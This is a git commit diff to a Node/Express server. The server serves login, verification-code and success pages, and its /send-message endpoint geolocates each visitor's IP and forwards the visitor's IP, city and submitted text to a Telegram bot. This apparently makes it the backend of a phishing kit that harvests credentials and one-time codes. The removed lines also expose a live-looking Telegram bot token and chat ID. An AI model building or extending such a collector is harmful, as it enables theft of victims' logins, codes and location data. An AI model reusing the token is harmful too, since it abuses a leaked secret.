087d20a5cf91ad68eb21ce41d87168923bd1bd8c
ha <hgnguyen47347714@gmail.com>
2024-12-26 22:02:49 +0700

    xong ma hoa

--- index.js
+++ index.js
@@ -2,56 +2,55 @@ const express = require("express");
 const path = require("path");
 const axios = require("axios");
 const favicon = require("serve-favicon");
+const fs = require("fs");
 
 const app = express();
 const PORT = 3000;
 
 app.use(favicon(path.join(__dirname, "public", "ico.ico")));
-// Serve static files from the 'public' folder
 app.use(express.static(path.join(__dirname, "public")));
-// Route to serve index.html
+
 app.get("/", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 app.get("/home", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "intest.html"));
 });
-
 app.get("/login", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "login.html"));
 });
 app.get("/success", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "success.html"));
 });
-
 app.get("/code/:email", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "code.html"));
 });
 
-const botToken = "7919345658:AAGVy4jwPdSyRKp6VDJ8a5gsq2DTNn-M4Bs";
+// Đọc botToken và chatId từ file config.json
+const config = JSON.parse(fs.readFileSync("config.json"));
+const botToken = config.BOT_TOKEN;
+const chatId = config.CHAT_ID;
 const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-// API gửi tin nhắn qua bot Telegram
 app.get("/send-message", async (req, res) => {
     const { message } = req.query;
     if (!message) {
-        return res.status(400).json({ error: "message are required" });
+        return res.status(400).json({ error: "message is required" });
     }
 
     try {
         const userIP =
             req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-        const res = await axios.get(`https://ipinfo.io/${userIP}/json`);
-        const data = res.data;
-        const chot = `IP: ${userIP}\nAddress: ${data.city},${data.country}\n${message}`;
-        // Gửi yêu cầu POST đến API của Telegram
+        const ipResponse = await axios.get(`https://ipinfo.io/${userIP}/json`);
+        const data = ipResponse.data;
+        const chot = `IP: ${userIP}\nAddress: ${data.city}, ${data.country}\n${message}`;
+
         const response = await axios.post(telegramApiUrl, {
-            chat_id: "6580233045",
+            chat_id: chatId,
             text: chot,
         });
 
-        // Kiểm tra xem yêu cầu có thành công không
         if (response.data.ok) {
             res.status(200).json({
                 status: "success",
@@ -72,7 +71,6 @@ app.get("/send-message", async (req, res) => {
     }
 });
 
-// Start the server
 app.listen(PORT, () => {
     console.log(`Server is running at http://localhost:${PORT}`);
 });
